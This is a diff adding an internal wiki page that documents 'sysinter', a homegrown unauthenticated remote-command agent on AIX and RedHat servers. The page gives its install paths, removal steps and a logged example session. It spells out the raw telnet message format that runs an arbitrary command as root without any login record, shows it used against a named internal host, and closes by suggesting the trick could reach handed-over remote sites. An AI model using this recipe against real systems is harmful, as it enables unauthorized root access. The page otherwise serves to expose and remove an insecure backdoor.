@@ -1,0 +1,75 @@
+====== SYSINTER ======
+
+This is a homegrown agent which will allow for access to servers from a remote instance.  It's not secure and should be removed wherever possible.
+
+=== Installation ===
+This is installed in the /etc/inetd.conf file and /usr/local/bin/sysinter.aix5 in AIX systems.\\ 
+To remove, comment out the entry and <code>refresh -s inetd</code>\\ 
+\\
+This is installed in the /etc/xinetd.d/sysinter-xinetd and /usr/local/bin/sysinter.redhat on RedHat systems.\\
+To remove, delete the sysinter-xinetd file and <code>systemctl reload xinetd</code>.
+
+=== Example ===
+
+Here’s what a complete session of the whole backdoor thing looks like.
+<code>bash-4.1# export BTFTPCMDFILE=/home/oracle/deploy/btftp.cmd
+bash-4.1# export RCMDPORTNUM=40035
+bash-4.1# export RCMDHOSTNAME=pgunap02.emea.int.tenneco.com
+bash-4.1# ./sh_rclt "/usr/bin/date"
+Tue Nov 19 14:44:31 CST 2019
+bash-4.1#
+</code>
+
+
+In the /var/log/messages on the other side, this is what’s seen:
+<code>
+Nov 19 14:44:31 pgunap02 xinetd[885]: START: sysinter pid=62744 from=::ffff:10.0.48.122
+Nov 19 14:44:31 pgunap02 xinetd[885]: EXIT: sysinter status=0 pid=62744 duration=0(sec)
+</code>
+
+There’s nothing in the /var/log/secure showing any login.
+
+I also figured out how to do it using only telnet to prove its insecure.
+Telnet to random box
+
+  telnet pgunap02.emea.int.tenneco.com 40035
+
+End every line with a null character and EOF.
+So it would be **<text>ctrl-v,ctrl-@,ctrl-d**
+
+Format your message like:
+
+  0 ctrl-v,ctrl-@,ctrl-d~|~~1^2%3 ctrl-v,ctrl-@,ctrl-d&#$%^&#% ctrl-v,ctrl-@,ctrl-d/usr/bin/touch /tmp/me ctrl-v,ctrl-@,ctrl-d
+
+You will receive three tildes to indicate success.
+
+Here’s me doing it using telnet from LX151.  “^@” represents “ctrl-v,ctrl-@” and there is no corresponding character for EOF.
+<code>
+leedsn16@cdcpillx151:~> telnet pgunap02.emea.int.tenneco.com 40035
+Trying 10.56.13.92...
+Connected to pgunap02.emea.int.tenneco.com.
+Escape character is '^]'.
+0^@~|~~1^2%3^@&#$%^&#%^@/usr/bin/touch /tmp/me^@~~~
+Connection closed by foreign host.
+leedsn16@cdcpillx151:~>
+</code>
+
+And the view from the other side.
+<code>
+root on pgunap02:/tmp $ ls
+lost+found   
+systemd-private-a708c4b366b448d083dc46fc8f1571d4-httpd.service-Zsuf72  
+systemd-private-a708c4b366b448d083dc46fc8f1571d4-vmtoolsd.service-FCqk0y
+packets.cap  
+systemd-private-a708c4b366b448d083dc46fc8f1571d4-ntpd.service-tNmYnm
+root on pgunap02:/tmp $ ls
+lost+found  
+packets.cap                                                            
+systemd-private-a708c4b366b448d083dc46fc8f1571d4-ntpd.service-tNmYnm
+me          
+systemd-private-a708c4b366b448d083dc46fc8f1571d4-httpd.service-Zsuf72  
+systemd-private-a708c4b366b448d083dc46fc8f1571d4-vmtoolsd.service-FCqk0y
+</code>
+
+I should be able to get into any machine using the sysinter agent using this technique.  I *really* recommend removing this.  But it might be a way to get into the remote sites that have been turned over but without a password change.
+
